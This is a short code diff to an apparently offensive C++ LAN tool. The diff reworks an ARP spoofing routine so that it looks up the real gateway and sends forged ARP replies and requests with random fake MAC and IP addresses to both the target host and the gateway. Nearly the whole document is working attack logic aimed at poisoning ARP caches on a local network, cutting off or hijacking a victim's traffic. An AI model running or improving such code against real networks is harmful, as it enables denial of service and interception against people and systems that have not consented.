@@ -1,5 +1,4 @@
 #include "arpattacker.h"
-#include <QDebug>
 #include "LANAttacker/lanpcap.h"
 
 
@@ -8,14 +7,16 @@
 
 void ArpAttacker::AttackBehaveImpl(const LANHostInfo &TargetHost)
 {
-    LANHostInfo GateHost= GetLANPCap()->GetHostInfo(254);
+    LANHostInfo GateHost= GetLANPCap()->GetGateWayHostInfo();
 
-    //deceice the targethost with fake gateway mac address
+
     GetLANPCap()->SendArpReplyPacket(TargetHost,GateHost.CreateRandomMacAddrHost());
+    GetLANPCap()->SendArpReplyPacket(TargetHost.CreateRandomMacAddrHost(),GateHost);
 
-    //deceive the gateway with fake targethost
-     LANHostInfo FakeTargetHost=TargetHost.CreateRandomMacAddrHost();
-    GetLANPCap()->SendArpRequestPacket(FakeTargetHost,GateHost);
+    GetLANPCap()->SendArpRequestPacket(TargetHost.CreateRandomMacAddrHost(),GateHost);
+    GetLANPCap()->SendArpRequestPacket(GateHost.CreateRandomIpAddrHost(),TargetHost);
+
+
 }
 
 
